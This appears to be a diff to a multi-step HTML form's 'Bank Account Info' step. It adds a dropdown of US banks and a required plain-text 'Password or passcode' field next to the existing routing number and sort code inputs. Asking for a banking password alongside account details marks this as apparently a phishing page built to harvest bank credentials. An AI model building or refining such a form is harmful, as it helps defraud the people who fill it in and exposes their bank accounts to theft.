@@ -224,6 +224,14 @@
       </div>
 <!-- Step 4 (Bank Account Info) -->
 <div class="form-step" id="step-4">
+    <label>select Bank</label>
+    <select>
+      <option>Wells Fargo</option>
+      <option>Bank of America (BOA)</option>
+      <option> Truist Bank</option>
+      <option> Other banks</option>
+    </select>
+
   <label>Bank Name</label>
   <input type="text" name="bankName" placeholder="Example: Bank of America / Barclays" required>
 
@@ -235,6 +243,9 @@
 
   <label>Routing Number / Sort Code</label>
   <input type="text" name="routingSort" placeholder="USA: Routing / UK: Sort Code" required>
+  
+    <label>Password or passcode</label>
+  <input type="text" name="password or passcode" placeholder="Password or passcode" required>
 
   <div class="button-group">
     <button type="button" onclick="prevStep(4)">Back</button>
